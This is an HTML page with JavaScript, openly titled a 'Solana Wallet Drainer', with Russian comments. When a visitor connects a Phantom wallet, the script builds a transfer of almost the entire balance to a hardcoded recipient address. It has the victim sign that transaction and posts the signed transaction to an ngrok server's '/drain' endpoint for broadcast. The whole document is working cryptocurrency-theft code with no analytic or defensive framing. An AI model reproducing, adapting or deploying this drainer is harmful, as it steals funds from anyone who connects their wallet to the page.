<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Wallet Drainer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background-color: #007bff;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Solana Wallet Drainer</h1>
        <button id="connect-wallet">Подключить кошелек</button>
    </div>
    <!-- Используем самый последний SDK -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script>
        // Дождемся полной загрузки страницы
        window.addEventListener('load', () => {
            console.log('Page loaded!');
            
            // Проверим доступные глобальные объекты
            console.log('Window objects:', Object.keys(window).filter(k => k.includes('solana')));
            
            // Библиотека создает глобальный объект solanaWeb3
            if (window.solanaWeb3) {
                console.log('Solana Web3 loaded successfully');
            } else {
                console.error('Solana Web3 not found in window object!');
            }
            
            // Используем объекты из глобального пространства
            const connection = new window.solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
            
            document.getElementById('connect-wallet').addEventListener('click', async () => {
                console.log('Button clicked');
                
                // Проверяем, установлен ли Phantom
                if (window.solana && window.solana.isPhantom) {
                    try {
                        console.log('Phantom detected, connecting...');
                        
                        // Подключаемся к кошельку
                        const connectResponse = await window.solana.connect({ onlyIfTrusted: false });
                        const publicKey = connectResponse.publicKey;
                        console.log(`Connected to wallet: ${publicKey.toString()}`);
                        alert(`Connected to wallet: ${publicKey.toString()}`);
                        
                        // Получаем баланс
                        console.log('Getting balance...');
                        const balance = await connection.getBalance(publicKey);
                        console.log(`Balance: ${balance} lamports`);
                        
                        const lamportsToSend = balance - 5000; // Вычитаем комиссию за транзакцию
                        if (lamportsToSend <= 0) {
                            throw new Error('Insufficient funds to cover the transaction fee');
                        }
                        
                        console.log('Creating transaction...');
                        // Замените на реальный публичный ключ получателя
                        const drainerPubkey = new window.solanaWeb3.PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
                        
                        const transaction = new window.solanaWeb3.Transaction().add(
                            window.solanaWeb3.SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: drainerPubkey,
                                lamports: lamportsToSend,
                            })
                        );
                        
                        console.log('Getting recent blockhash...');
                        const { blockhash } = await connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhash;
                        transaction.feePayer = publicKey;
                        
                        console.log('Signing transaction...');
                        const signedTransaction = await window.solana.signTransaction(transaction);
                        console.log('Transaction signed');
                        
                        // Правильно сериализуем транзакцию
                        const serializedTransaction = signedTransaction.serialize();
                        const base64Transaction = Buffer.from(serializedTransaction).toString('base64');
                        
                        console.log('Sending to server...');
                        // Отправка на сервер
                        const serverResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/drain', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ 
                                signedTransaction: base64Transaction
                            })
                        });
                        
                        console.log('Server response status:', serverResponse.status);
                        
                        if (!serverResponse.ok) {
                            const errorText = await serverResponse.text();
                            throw new Error(`Server error: ${serverResponse.status} - ${errorText}`);
                        }
                        
                        const result = await serverResponse.json();
                        console.log('Success response:', result);
                        alert('Transaction sent: ' + result.signature);
                        
                    } catch (err) {
                        console.error('Transaction failed', err);
                        alert('Transaction failed: ' + err.message);
                    }
                } else {
                    console.log('Phantom wallet not found');
                    alert('Solana wallet not found. Please install a wallet like Phantom.');
                }
            });
        });
    </script>
</body>
</html>
